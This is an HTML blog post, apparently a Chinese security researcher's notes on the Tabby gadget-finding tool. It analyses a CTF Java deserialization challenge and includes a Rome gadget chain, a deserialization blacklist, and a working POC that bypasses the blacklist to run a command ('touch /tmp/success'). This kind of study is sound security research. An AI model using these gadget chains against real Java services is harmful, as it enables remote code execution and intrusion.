@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"l3yx.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="Tabby学习笔记，挖掘反序列化gadget的思路和一些链的详细分析及POC">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tabby学习笔记 &amp; Java反序列化gadget分析">
+<meta property="og:url" content="https://l3yx.github.io/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="l3yx&#39;s blog">
+<meta property="og:description" content="Tabby学习笔记，挖掘反序列化gadget的思路和一些链的详细分析及POC">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://l3yx.github.io/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/image-20230520230016662.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/image-20230526013111136.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/image-20230527092611872.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/image-20230527101015470.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/image-20230527104429695.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/image-20230527112506697.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/image-20230528111243845.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/image-20230528112234995.png">
+<meta property="article:published_time" content="2023-05-20T09:57:26.000Z">
+<meta property="article:modified_time" content="2023-05-28T04:26:03.114Z">
+<meta property="article:author" content="淚笑">
+<meta property="article:tag" content="Java反序列化漏洞">
+<meta property="article:tag" content="Tabby">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://l3yx.github.io/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/image-20230520230016662.png">
+
+
+<link rel="canonical" href="https://l3yx.github.io/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://l3yx.github.io/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/","path":"2023/05/20/Tabby学习笔记-Java反序列化gadget分析/","title":"Tabby学习笔记 & Java反序列化gadget分析"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Tabby学习笔记 & Java反序列化gadget分析 | l3yx's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">l3yx's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Neo4j"><span class="nav-number">1.1.</span> <span class="nav-text">Neo4j</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Tabby"><span class="nav-number">1.2.</span> <span class="nav-text">Tabby</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">案例分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2022-%E9%95%BF%E5%9F%8E%E6%9D%AF-b4bycoffee"><span class="nav-number">2.1.</span> <span class="nav-text">2022 长城杯 b4bycoffee</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Rome"><span class="nav-number">2.1.1.</span> <span class="nav-text">Rome</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87Tabby%E5%AF%BB%E6%89%BE%E5%85%B6%E4%BB%96%E9%93%BE"><span class="nav-number">2.1.2.</span> <span class="nav-text">通过Tabby寻找其他链</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Case1-HashMap-HotSwappableTargetSource-equals-XString-equals-toString"><span class="nav-number">2.1.2.1.</span> <span class="nav-text">Case1 (HashMap -&gt; HotSwappableTargetSource.equals -&gt; XString.equals -&gt; .toString)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Case2-%E2%9D%8C"><span class="nav-number">2.1.2.2.</span> <span class="nav-text">Case2 (❌)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Case3-ConcurrentHashMap-HashMap-ObjectIdGenerator-IdKey-equals-XString-equals-toString"><span class="nav-number">2.1.2.3.</span> <span class="nav-text">Case3 (ConcurrentHashMap &#x2F; HashMap -&gt; ObjectIdGenerator$IdKey.equals -&gt; XString.equals -&gt; .toString)</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="淚笑"
+      src="/resources/avatar.jpg">
+  <p class="site-author-name" itemprop="name">淚笑</p>
+  <div class="site-description" itemprop="description">学的越多，懂的越少</div>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/l3yx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;l3yx" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1729888211@qq.com" title="E-Mail → mailto:1729888211@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://l3yx.github.io/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/resources/avatar.jpg">
+      <meta itemprop="name" content="淚笑">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l3yx's blog">
+      <meta itemprop="description" content="学的越多，懂的越少">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Tabby学习笔记 & Java反序列化gadget分析 | l3yx's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Tabby学习笔记 & Java反序列化gadget分析
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-05-20 17:57:26" itemprop="dateCreated datePublished" datetime="2023-05-20T17:57:26+08:00">2023-05-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-05-28 12:26:03" itemprop="dateModified" datetime="2023-05-28T12:26:03+08:00">2023-05-28</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>Tabby学习笔记，挖掘反序列化gadget的思路和一些链的详细分析及POC</p>
+<span id="more"></span>
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="Neo4j"><a href="#Neo4j" class="headerlink" title="Neo4j"></a>Neo4j</h3><p>Tabby需要用到Neo4j，项目中有相应的Dockerfile，直接启动，7474为Web端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/wh1t3p1g/tabby.git</span><br><span class="line">cd tabby/env</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>检查环境和插件是否成功加载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CALL apoc.help(&#x27;all&#x27;)</span><br><span class="line">CALL tabby.help(&#x27;all&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/image-20230520230016662.png" alt="image-20230520230016662"></p>
+<h3 id="Tabby"><a href="#Tabby" class="headerlink" title="Tabby"></a>Tabby</h3><p><a target="_blank" rel="noopener" href="https://github.com/wh1t3p1g/tabby/issues/20#issuecomment-960531316">Java版本建议和作者一致或略高</a>，Tabby使用的构建工具是Gradle，可以通过<code>./gradlew tasks</code>查看当前工程中可使用的任务</p>
+<p>使用<code>./gradlew bootJar</code>编译打包，编译好的Jar包在<code>build/libs</code>目录</p>
+<p>Tabby 1.1.0 版本以后使用配置文件的方式来进行分析，将<code>tabby.jar</code>放到项目根目录，并按需修改<code>config/settings.properties</code>中的<a target="_blank" rel="noopener" href="https://github.com/wh1t3p1g/tabby/blob/master/doc/Tabby%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%8B%E7%BB%8D.md">配置</a>，因为我的Neo4j是Docker启动的，配置中<code>tabby.cache.isDockerImportPath</code>需要设置为<code>true</code></p>
+<p>配置设置好后，运行<code>java -Xmx10g -jar tabby.jar</code>或者<code>./run.sh</code>，内存大小根据实际情况进行调整</p>
+<h2 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h2><h3 id="2022-长城杯-b4bycoffee"><a href="#2022-长城杯-b4bycoffee" class="headerlink" title="2022 长城杯 b4bycoffee"></a>2022 长城杯 b4bycoffee</h3><p>Jar包下载：<a target="_blank" rel="noopener" href="https://share.weiyun.com/kkQkgmVZ">https://share.weiyun.com/kkQkgmVZ</a></p>
+<p>备用：<a href="/resource/b4bycoffee_f18028284cae793d0b1da80146f01bd0.zip">b4bycoffee_f18028284cae793d0b1da80146f01bd0.zip</a></p>
+<p>反编译分析源码，存在反序列化入口和Rome依赖：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">coffeeController</span> &#123;</span><br><span class="line">  <span class="meta">@RequestMapping(&#123;&quot;/b4by/coffee&quot;&#125;)</span></span><br><span class="line">  <span class="keyword">public</span> Message <span class="title function_">order</span><span class="params">(<span class="meta">@RequestBody</span> CoffeeRequest coffee)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (coffee.Venti != <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(coffee.Venti));</span><br><span class="line">      <span class="type">AntObjectInputStream</span> <span class="variable">antInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AntObjectInputStream</span>(inputStream);</span><br><span class="line">      <span class="type">Venti</span> <span class="variable">venti</span> <span class="operator">=</span> (Venti)antInputStream.readObject();</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.rometools<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是有以下黑名单：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AntObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> List&lt;String&gt; list;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">AntObjectInputStream</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="built_in">super</span>(inputStream);</span><br><span class="line">    <span class="built_in">this</span>.list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="built_in">this</span>.list.add(BadAttributeValueExpException.class.getName());</span><br><span class="line">    <span class="built_in">this</span>.list.add(ObjectBean.class.getName());</span><br><span class="line">    <span class="built_in">this</span>.list.add(ToStringBean.class.getName());</span><br><span class="line">    <span class="built_in">this</span>.list.add(TemplatesImpl.class.getName());</span><br><span class="line">    <span class="built_in">this</span>.list.add(Runtime.class.getName());</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.list.contains(desc.getName()))</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unauthorized deserialization attempt&quot;</span>, desc</span><br><span class="line">          </span><br><span class="line">          .getName()); </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="Rome"><a href="#Rome" class="headerlink" title="Rome"></a>Rome</h4><p>一般Rome利用链构造如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">Tool.setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,Tool.getTemplatesImplCMDByteCodes(<span class="string">&quot;open -a calculator&quot;</span>));</span><br><span class="line">Tool.setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;x&quot;</span>);</span><br><span class="line">Tool.setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">Tool.setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">//templates.getOutputProperties();</span></span><br><span class="line"></span><br><span class="line"><span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templates);</span><br><span class="line"><span class="comment">//toStringBean.toString();</span></span><br><span class="line"></span><br><span class="line"><span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"><span class="comment">//equalsBean.hashCode();</span></span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">hashMap.put(equalsBean, <span class="string">&quot;x&quot;</span>);</span><br><span class="line">Tool.setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);    <span class="comment">//这里必须将_class设置为null，否则在反序列化hashMap的时候会ClassNotFoundException。因为在HashMap.put的时候TemplatesImpl.getOutputProperties()已经被触发一次了，_class中将会存储_bytecodes defineClass后的类</span></span><br><span class="line"><span class="comment">//deserialize hashMap</span></span><br><span class="line"></span><br><span class="line"><span class="type">byte</span>[]  poc = Tool.serialize(hashMap);</span><br></pre></td></tr></table></figure>
+
+<p>调用栈：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties(), TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">toString(String), ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">toString(), ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">beanHashCode(), EqualsBean (com.sun.syndication.feed.impl)</span><br><span class="line">hashCode(), EqualsBean (com.sun.syndication.feed.impl)</span><br><span class="line">hash(Object), HashMap (java.util)</span><br><span class="line">readObject(ObjectInputStream), HashMap (java.util)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>其中<code>TemplatesImpl</code>和<code>ToStringBean</code>被黑名单禁止了，但是<code>EqualsBean</code>可以用，并且代码中<code>CoffeeBean</code>类的<code>toString</code>方法可以执行任意代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CoffeeBean</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;Coffee bean&quot;</span>;  </span><br><span class="line">  <span class="keyword">private</span> <span class="type">byte</span>[] ClassByte;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    com.example.b4bycoffee.model.<span class="type">CoffeeBean</span> <span class="variable">coffeeBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.example.b4bycoffee.model.CoffeeBean();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> coffeeBean.defineClass((String)<span class="literal">null</span>, <span class="built_in">this</span>.ClassByte, <span class="number">0</span>, <span class="built_in">this</span>.ClassByte.length);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      var3 = clazz.newInstance();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InstantiationException var5) &#123;</span><br><span class="line">      var5.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">      var6.printStackTrace();</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;A cup of Coffee --&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>那么很容易构造出POC：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">CoffeeBean</span> <span class="variable">coffeeBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CoffeeBean</span>();</span><br><span class="line">Tool.setFieldValue(coffeeBean,<span class="string">&quot;ClassByte&quot;</span>,Tool.getCMDByteCodes(<span class="string">&quot;touch /tmp/success&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(CoffeeBean.class,coffeeBean);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">hashMap.put(equalsBean, <span class="string">&quot;x&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> Tool.encodeBase64(Tool.serialize(hashMap));</span><br></pre></td></tr></table></figure>
+
+<p>调用栈为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">toString(), CoffeeBean (com.example.b4bycoffee.model)</span><br><span class="line">beanHashCode(), EqualsBean (com.rometools.rome.feed.impl)</span><br><span class="line">hashCode(), EqualsBean (com.rometools.rome.feed.impl)</span><br><span class="line">hash(Object), HashMap (java.util)</span><br><span class="line">readObject(ObjectInputStream), HashMap (java.util)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="通过Tabby寻找其他链"><a href="#通过Tabby寻找其他链" class="headerlink" title="通过Tabby寻找其他链"></a>通过Tabby寻找其他链</h4><p>修改配置文件，并运行<code>java -Xmx10g -jar tabby.jar</code></p>
